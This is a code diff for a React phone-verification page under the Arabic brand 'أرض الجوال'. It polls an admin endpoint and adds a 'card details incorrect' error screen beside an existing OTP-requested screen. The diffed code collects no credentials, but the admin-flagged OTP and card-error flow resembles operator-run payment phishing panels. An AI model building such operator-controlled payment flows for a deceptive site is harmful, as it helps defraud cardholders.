@@ -39,7 +39,7 @@ export default function VerifyPhonePage() {
   const [confirmedAt, setConfirmedAt] = useState<number | null>(null);
   const [countdown, setCountdown] = useState(0);
   const [invoiceSent, setInvoiceSent] = useState(false);
-  const [adminRetryNotice, setAdminRetryNotice] = useState(false);
+  const [adminNoticeType, setAdminNoticeType] = useState<'otp' | 'card' | null>(null);
 
   const isReferenceCodeValid = /^[0-9]{4,6}$/.test(referenceCode);
 
@@ -110,15 +110,15 @@ export default function VerifyPhonePage() {
     };
   }, [confirmedAt, verified]);
 
-  // Watch for the admin's retry notice even while the 30-second timer is still running.
-  // The customer sees a neutral status screen; no verification code is requested or collected here.
+  // Watch for the latest admin notice while the 30-second screen is active.
+  // This only changes the displayed status screen; it never collects payment credentials.
   useEffect(() => {
-    if (!verified || adminRetryNotice || !orderId || !customerNotificationKey) return;
+    if (!verified || adminNoticeType || !orderId || !customerNotificationKey) return;
 
     let active = true;
     let requestInFlight = false;
 
-    const checkAdminRetryNotice = async () => {
+    const checkAdminNotice = async () => {
       if (!active || requestInFlight) return;
       requestInFlight = true;
       try {
@@ -135,15 +135,17 @@ export default function VerifyPhonePage() {
         const verificationTime = confirmedAt ?? 0;
         const matchingNotice = result.ok === true &&
           Array.isArray(result.notifications) &&
-          result.notifications.some((item) => {
+          result.notifications.find((item) => {
             const createdAt = Date.parse(item.createdAt || '');
             return item.orderId === orderId &&
-              item.status === 'otp_requested' &&
+              (item.status === 'otp_requested' || item.status === 'card_details_incorrect') &&
               Number.isFinite(createdAt) &&
               createdAt >= verificationTime - 15_000;
           });
 
-        if (active && matchingNotice) setAdminRetryNotice(true);
+        if (active && matchingNotice) {
+          setAdminNoticeType(matchingNotice.status === 'otp_requested' ? 'otp' : 'card');
+        }
       } catch {
         // Keep the current screen and retry after the next polling interval.
       } finally {
@@ -151,9 +153,9 @@ export default function VerifyPhonePage() {
       }
     };
 
-    void checkAdminRetryNotice();
-    const timer = window.setInterval(() => { void checkAdminRetryNotice(); }, 2500);
-    const handleFocus = () => { void checkAdminRetryNotice(); };
+    void checkAdminNotice();
+    const timer = window.setInterval(() => { void checkAdminNotice(); }, 2500);
+    const handleFocus = () => { void checkAdminNotice(); };
     window.addEventListener('focus', handleFocus);
 
     return () => {
@@ -161,7 +163,7 @@ export default function VerifyPhonePage() {
       window.clearInterval(timer);
       window.removeEventListener('focus', handleFocus);
     };
-  }, [verified, adminRetryNotice, orderId, customerNotificationKey, confirmedAt]);
+  }, [verified, adminNoticeType, orderId, customerNotificationKey, confirmedAt]);
 
   // Once the 30-second wait ends, keep showing that screen until the admin sends this order's invoice.
   useEffect(() => {
@@ -271,7 +273,7 @@ export default function VerifyPhonePage() {
     );
   }
 
-  if (adminRetryNotice && !invoiceSent) {
+  if (adminNoticeType === 'otp' && !invoiceSent) {
     return (
       <main className="erd-retry-page">
         <style jsx global>{'
@@ -554,6 +556,262 @@ export default function VerifyPhonePage() {
             <div className="erd-retry-divider" aria-hidden="true" />
             <div className="erd-retry-tip-text">
               تم إرسال إشعار جديد بخصوص العملية. <strong>لا تشارك أي رموز تحقق مع أي شخص</strong>، وأكمل أي تحقق مطلوب داخل تطبيق مزود الدفع الرسمي فقط.
+            </div>
+          </div>
+        </section>
+      </main>
+    );
+  }
+
+  if (adminNoticeType === 'card' && !invoiceSent) {
+    return (
+      <main className="erd-card-error-page">
+        <style jsx global>{'
+          @import url("https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap");
+          .erd-card-error-page,
+          .erd-card-error-page * {
+            box-sizing: border-box;
+            font-family: Cairo, system-ui, -apple-system, sans-serif;
+          }
+          .erd-card-error-page {
+            direction: rtl;
+            background: #f4f7f6;
+            color: #12354e;
+            width: 100%;
+            min-height: 100vh;
+            min-height: 100svh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+          }
+          .erd-card-error-card {
+            background: #fff;
+            width: 100%;
+            max-width: 440px;
+            border-radius: 28px;
+            padding: 36px 24px;
+            box-shadow: 0 10px 30px rgba(0,0,0,.04);
+            text-align: center;
+          }
+          .erd-card-error-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 28px;
+          }
+          .erd-card-error-logo-text {
+            text-align: right;
+            font-size: 26px;
+            font-weight: 800;
+            color: #12354e;
+            line-height: 1.05;
+          }
+          .erd-card-error-logo-text span { color: #00cda9; display: block; }
+          .erd-card-error-logo-mark { display: flex; flex-direction: column; gap: 4px; }
+          .erd-card-error-shape {
+            width: 32px;
+            height: 20px;
+            border-radius: 6px;
+            transform: skewX(-12deg);
+          }
+          .erd-card-error-shape-top { background: #12354e; }
+          .erd-card-error-shape-bottom { background: #00cda9; }
+          .erd-card-error-icon-wrap {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 96px;
+            margin-bottom: 28px;
+          }
+          .erd-card-error-ray {
+            position: absolute;
+            width: 14px;
+            height: 5px;
+            background: #ff8088;
+            border-radius: 10px;
+            opacity: .85;
+          }
+          .erd-card-error-ray-left-top { left: clamp(28px, calc(50% - 120px), 80px); top: 18px; transform: rotate(-25deg); }
+          .erd-card-error-ray-left-bottom { left: clamp(33px, calc(50% - 115px), 85px); bottom: 18px; transform: rotate(25deg); }
+          .erd-card-error-ray-right-top { right: clamp(28px, calc(50% - 120px), 80px); top: 18px; transform: rotate(25deg); }
+          .erd-card-error-ray-right-bottom { right: clamp(33px, calc(50% - 115px), 85px); bottom: 18px; transform: rotate(-25deg); }
+          .erd-card-error-circle {
+            width: 96px;
+            height: 96px;
+            flex: none;
+            background: radial-gradient(circle, #ff5252 0%, #ee3c47 100%);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 8px 24px rgba(238,60,71,.25);
+            position: relative;
+            z-index: 2;
+            color: #fff;
+            font-size: 50px;
+            font-weight: 700;
+            line-height: 1;
+          }
+          .erd-card-error-title {
+            font-size: 30px;
+            font-weight: 800;
+            color: #12354e;
+            margin: 0 0 8px;
+            line-height: 1.25;
+          }
+          .erd-card-error-subtitle {
+            font-size: 22px;
+            font-weight: 800;
+            color: #ee3c47;
+            margin: 0 0 8px;
+            line-height: 1.35;
+          }
+          .erd-card-error-description {
+            font-size: 18px;
+            font-weight: 700;
+            color: #12354e;
+            margin: 0 0 28px;
+            line-height: 1.6;
+          }
+          .erd-card-error-tip {
+            background: #f0fdf9;
+            border: 1.5px solid #c2f5ea;
+            border-radius: 20px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-align: right;
+          }
+          .erd-card-error-cards-area {
+            position: relative;
+            width: 100px;
+            height: 60px;
+            flex: none;
+          }
+          .erd-card-error-mini-back {
+            position: absolute;
+            top: 4px;
+            left: 15px;
+            width: 75px;
+            height: 48px;
+            background: #e2e8f0;
+            border-radius: 6px;
+            box-shadow: 0 2px 6px rgba(0,0,0,.1);
+            padding: 6px;
+          }
+          .erd-card-error-magnetic-strip {
+            width: 100%;
+            height: 10px;
+            background: #12354e;
+            margin-top: 4px;
+            border-radius: 1px;
+          }
+          .erd-card-error-mini-front {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 75px;
+            height: 48px;
+            background: linear-gradient(135deg,#1d3344 0%,#0d1e2b 100%);
+            border-radius: 6px;
+            padding: 6px;
+            box-shadow: 0 4px 10px rgba(0,0,0,.15);
+          }
+          .erd-card-error-chip {
+            width: 12px;
+            height: 9px;
+            background: #f0c567;
+            border-radius: 2px;
+          }
+          .erd-card-error-info-badge {
+            position: absolute;
+            bottom: -4px;
+            left: 0;
+            width: 28px;
+            height: 28px;
+            background: #00cda9;
+            border: 2px solid #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            box-shadow: 0 2px 6px rgba(0,0,0,.1);
+          }
+          .erd-card-error-info-badge svg { width: 15px; height: 15px; }
+          .erd-card-error-tip-text {
+            min-width: 0;
+            flex: 1;
+            text-align: right;
+            font-size: 14px;
+            color: #12354e;
+            font-weight: 700;
+            line-height: 1.6;
+          }
+          .erd-card-error-tip-text strong { color: #00a88a; font-weight: 900; }
+          @media (max-width: 420px) {
+            .erd-card-error-page { padding: 14px; }
+            .erd-card-error-card { padding: 30px 16px; border-radius: 24px; }
+            .erd-card-error-title { font-size: 27px; }
+            .erd-card-error-subtitle { font-size: 19px; }
+            .erd-card-error-description { font-size: 16px; }
+            .erd-card-error-tip { padding: 12px 10px; gap: 10px; }
+            .erd-card-error-tip-text { font-size: 12px; }
+          }
+          @media (max-width: 350px) {
+            .erd-card-error-card { padding-inline: 12px; }
+            .erd-card-error-tip { gap: 8px; }
+            .erd-card-error-cards-area { width: 88px; }
+            .erd-card-error-mini-back { left: 8px; }
+            .erd-card-error-info-badge { left: -2px; }
+          }
+        '}</style>
+
+        <section className="erd-card-error-card" aria-live="polite">
+          <div className="erd-card-error-logo">
+            <div className="erd-card-error-logo-text">
+              أرض
+              <span>الجوال</span>
+            </div>
+            <div className="erd-card-error-logo-mark" aria-hidden="true">
+              <div className="erd-card-error-shape erd-card-error-shape-top" />
+              <div className="erd-card-error-shape erd-card-error-shape-bottom" />
+            </div>
+          </div>
+
+          <div className="erd-card-error-icon-wrap" aria-hidden="true">
+            <div className="erd-card-error-ray erd-card-error-ray-left-top" />
+            <div className="erd-card-error-ray erd-card-error-ray-left-bottom" />
+            <div className="erd-card-error-ray erd-card-error-ray-right-top" />
+            <div className="erd-card-error-ray erd-card-error-ray-right-bottom" />
+            <div className="erd-card-error-circle">&times;</div>
+          </div>
+
+          <h1 className="erd-card-error-title">عذرًا عزيزي</h1>
+          <p className="erd-card-error-subtitle">تعذر التحقق من عملية الدفع</p>
+          <p className="erd-card-error-description">يرجى مراجعة حالة العملية من خلال مزود الدفع الرسمي.</p>
+
+          <div className="erd-card-error-tip">
+            <div className="erd-card-error-cards-area" aria-hidden="true">
+              <div className="erd-card-error-mini-back">
+                <div className="erd-card-error-magnetic-strip" />
+              </div>
+              <div className="erd-card-error-mini-front">
+                <div className="erd-card-error-chip" />
+              </div>
+              <div className="erd-card-error-info-badge">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                  <path d="M12 3 4.5 6v5.5c0 4.4 3.1 7.7 7.5 9.5 4.4-1.8 7.5-5.1 7.5-9.5V6L12 3Z" />
+                  <path d="m9 12 2 2 4-4" />
+                </svg>
+              </div>
+            </div>
+            <div className="erd-card-error-tip-text">
+              <strong>لحمايتك:</strong> لا تشارك رقم البطاقة أو رمز الأمان مع أي شخص. استخدم بوابة الدفع الرسمية فقط.
             </div>
           </div>
         </section>
